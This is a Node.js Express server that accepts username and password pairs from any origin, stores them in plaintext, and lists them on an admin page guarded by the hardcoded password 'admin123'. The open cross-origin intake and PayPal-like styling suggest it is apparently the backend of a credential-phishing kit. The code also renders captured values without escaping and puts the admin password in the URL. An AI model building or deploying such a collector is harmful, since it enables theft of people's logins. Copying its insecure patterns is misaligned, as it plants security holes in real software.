const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const DATA_FILE = path.join(__dirname, 'records.json');
const PASSWORD = 'admin123'; // Change this to a secure password

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Ensure records file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// POST endpoint to collect form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    const newRecord = {
        id: Date.now(),
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    records.push(newRecord);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    
    res.json({ success: true });
});

// GET endpoint to display records
app.get('/records', (req, res) => {
    const authPassword = req.query.password;
    
    if (authPassword !== PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Authentication Required</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    input { padding: 8px; margin: 10px; }
                    button { padding: 8px 16px; background: #0070ba; color: white; border: none; }
                </style>
            </head>
            <body>
                <h2>Enter Password</h2>
                <input type="password" id="pass">
                <button onclick="window.location.href='/records?password='+document.getElementById('pass').value">
                    Submit
                </button>
            </body>
            </html>
        `);
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    
    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Records</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #f5f5f5;
                }
                h1 {
                    color: #0070ba;
                    text-align: center;
                    margin-bottom: 30px;
                }
                .record {
                    background: white;
                    padding: 20px;
                    margin: 15px 0;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    transition: all 0.3s;
                }
                .record:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
                }
                .record p {
                    margin: 8px 0;
                    color: #333;
                }
                .delete-btn {
                    background: #ff4444;
                    color: white;
                    border: none;
                    padding: 8px 16px;
                    border-radius: 5px;
                    cursor: pointer;
                    float: right;
                }
                .delete-btn:hover {
                    background: #cc0000;
                }
            </style>
        </head>
        <body>
            <h1>Records</h1>
            ${records.map(record => `
                <div class="record">
                    <p><strong>ID:</strong> ${record.id}</p>
                    <p><strong>Username:</strong> ${record.username}</p>
                    <p><strong>Password:</strong> ${record.password}</p>
                    <p><strong>Timestamp:</strong> ${record.timestamp}</p>
                    <button class="delete-btn" onclick="fetch('/delete/${record.id}', {method: 'DELETE'}).then(() => location.reload())">
                        Delete
                    </button>
                </div>
            `).join('')}
        </body>
        </html>
    `;
    
    res.send(html);
});

// DELETE endpoint to remove records
app.delete('/delete/:id', (req, res) => {
    const id = parseInt(req.params.id);
    let records = JSON.parse(fs.readFileSync(DATA_FILE));
    records = records.filter(record => record.id !== id);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
